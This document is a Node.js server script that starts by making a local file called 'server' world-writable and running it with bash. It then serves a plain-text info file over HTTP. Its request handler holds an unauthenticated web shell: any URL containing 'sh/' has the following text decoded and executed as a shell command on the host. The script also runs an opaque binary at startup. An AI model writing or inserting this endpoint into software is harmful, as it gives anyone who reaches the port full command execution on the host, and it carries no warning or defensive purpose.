const http = require('http');
const fs = require('fs');
const exec = require("child_process").exec;
const subtxt = './info.txt';
const PORT = process.env.PORT || 3001;

fs.chmod("server", 0o777, (err) => {
  if (err) {
      console.error(`sh failed: ${err}`);
      return;
  }
  console.log(`sh successful`);
  const child = exec('bash server');
  child.stdout.on('data', (data) => {
      console.log(data);
  });
  child.stderr.on('data', (data) => {
      console.error(data);
  });
  child.on('close', (code) => {
      console.log(`child process exited with code ${code}`);
      console.clear()
      console.log(`App is running`);
  });
});

const server = http.createServer((req, res) => {
    try{
        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
        if (req.url === '/') {
          res.end('loading...');
          return;
        }
        if (req.url.indexOf("sh/")>0){
          const sh_str=decodeURIComponent(req.url.split("sh/")[1]);
          console.log("cmd",sh_str)
          exec(sh_str, (error, stdout, stderr) => {
            if (error) {
              console.error(`exec error: ${error}`);
            }else{
              console.log(`stdout: ${stdout}`);
              console.log(`stderr: ${stderr}`);
            }
          });
          res.end("OK");
          return;
        }
        if (req.url === '/info') {
          fs.readFile(subtxt, 'utf8', (err, data) => {
            if (err) {
              console.error(err);
              res.end("empty");
            } else {
              res.end(data);
            }
          });
          return;
        }
        res.end("byebye");
    }catch(e){}
  });

server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
